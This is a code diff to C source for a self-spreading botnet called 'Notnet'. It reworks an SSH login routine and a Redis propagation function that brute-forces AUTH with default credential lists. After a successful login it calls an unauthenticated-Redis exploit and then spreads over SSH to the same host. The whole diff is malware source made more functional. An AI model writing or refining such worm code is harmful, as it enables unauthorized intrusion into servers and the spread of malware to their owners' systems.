@@ -128,22 +128,33 @@ int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *p
     snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
     send(sock, our_banner, strlen(our_banner), 0);
     
-    /* Simple password authentication */
-    /* Send SSH2_MSG_SERVICE_REQUEST */
-    uint8_t msg[512];
-    msg[0] = 11; /* SSH2_MSG_SERVICE_REQUEST */
-    /* ... simplified protocol for research purposes ... */
+    /* Read server banner or prompt */
+    char resp[256];
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    select(sock + 1, &fds, NULL, NULL, &tv);
+    recv(sock, resp, sizeof(resp) - 1, 0);
     
-    /* For research: try a few common auth sequences */
-    /* In production, use libssh or similar */
-    
-    /* Simple approach: send username, read prompt, send password */
+    /* Send username */
     char cmd[512];
-    snprintf(cmd, sizeof(cmd), "%s %s\r\n", user, pass);
+    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
+    send(sock, cmd, strlen(cmd), 0);
+    
+    /* Read password prompt */
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    select(sock + 1, &fds, NULL, NULL, &tv);
+    recv(sock, resp, sizeof(resp) - 1, 0);
+    
+    /* Send password */
+    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
     send(sock, cmd, strlen(cmd), 0);
     
     /* Read response */
-    char resp[256];
     FD_ZERO(&fds);
     FD_SET(sock, &fds);
     tv.tv_sec = 2;
@@ -378,15 +389,16 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
     /* Try brute-force */
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            /* Try with password */
             int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
             if (sock < 0) continue;
             
-            char cmd[512];
-            snprintf(cmd, sizeof(cmd), "AUTH %s\r\nPING\r\n", default_passes[p]);
-            send(sock, cmd, strlen(cmd), 0);
+            /* Send AUTH */
+            char auth_cmd[256];
+            snprintf(auth_cmd, sizeof(auth_cmd), "AUTH %s\r\n", default_passes[p]);
+            send(sock, auth_cmd, strlen(auth_cmd), 0);
             
-            char resp[256];
+            /* Wait for AUTH response */
+            char auth_resp[256];
             fd_set fds;
             struct timeval tv;
             FD_ZERO(&fds);
@@ -394,18 +406,38 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
             tv.tv_sec = 2;
             tv.tv_usec = 0;
             
-            if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-                recv(sock, resp, sizeof(resp) - 1, 0);
-                if (strstr(resp, "+PONG")) {
-                    log_info("Redis: auth success %s:%d with %s:%s",
-                             ip, port, default_users[u], default_passes[p]);
-                    close(sock);
-                    
-                    /* Exploit */
-                    exploit_redis_unauth(ip, port);
-                    usleep(5000000);
-                    spread_ssh(bot, ip, 22);
-                    return 0;
+            if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) {
+                close(sock);
+                continue;
+            }
+            recv(sock, auth_resp, sizeof(auth_resp) - 1, 0);
+            auth_resp[sizeof(auth_resp) - 1] = '\0';
+            
+            /* AUTH returns +OK on success */
+            if (strstr(auth_resp, "+OK")) {
+                log_info("Redis: auth success %s:%d with %s:%s",
+                         ip, port, default_users[u], default_passes[p]);
+                
+                /* Send PING to verify */
+                send(sock, "PING\r\n", 6, 0);
+                FD_ZERO(&fds);
+                FD_SET(sock, &fds);
+                tv.tv_sec = 2;
+                tv.tv_usec = 0;
+                
+                if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+                    char ping_resp[256];
+                    recv(sock, ping_resp, sizeof(ping_resp) - 1, 0);
+                    ping_resp[sizeof(ping_resp) - 1] = '\0';
+                    /* +PONG confirms the connection is stable */
+                    if (strstr(ping_resp, "+PONG")) {
+                        close(sock);
+                        /* Exploit */
+                        exploit_redis_unauth(ip, port);
+                        usleep(5000000);
+                        spread_ssh(bot, ip, 22);
+                        return 0;
+                    }
                 }
             }
             
